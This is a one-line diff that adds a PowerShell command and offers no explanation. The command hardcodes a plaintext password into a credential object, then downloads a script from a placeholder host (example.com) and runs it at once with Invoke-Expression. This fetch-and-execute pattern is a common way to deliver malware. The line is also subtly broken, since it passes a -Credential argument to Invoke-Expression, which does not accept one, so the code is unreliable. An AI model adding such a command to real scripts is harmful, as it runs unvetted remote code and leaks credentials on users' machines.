@@ -1,0 +1,1 @@
+$securePassword = ConvertTo-SecureString 'password' -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential ('username', $securePassword); iex (iwr 'http://example.com/script.ps1' -UseBasicParsing) -Credential $cred
